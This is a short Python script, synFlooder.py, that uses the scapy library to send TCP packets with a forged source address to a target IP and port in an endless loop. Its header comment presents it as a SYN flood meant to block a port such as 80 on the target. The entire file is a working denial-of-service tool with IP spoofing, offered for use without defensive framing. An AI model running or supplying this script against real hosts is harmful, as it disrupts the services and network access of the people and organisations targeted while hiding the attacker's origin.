#synFlooder.py: This Python script will attempt a SYN Flood attack. 
#The script will consistently send packets to the destination IP address and port
#specified by the user, masquerading as an IP address different than the machine
#that is running the program. For example, this script can be used to block port
#80 on the target, resulting in the target being unable to/slowly able to access
#the internet.

#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/19/2021

from scapy.all import *

def synFlood(src, target, message, dstPort):
    ipLayer = IP(src=src, dst=target)
    tcpLayer = TCP(sport=4444, dport=dstPort)
    rawLayer = Raw(load=message)
    packet = ipLayer/tcpLayer/rawLayer
    send(packet)

src = input("Enter Source IP Address To Fake: ")
target=input("Enter Target's IP Address: ")
message = input("Enter Message FOR TCP Payload: ")
dstPort= int(input("Enter Port to Block: "))

while True:
        synFlood(src, target, message, dstPort)
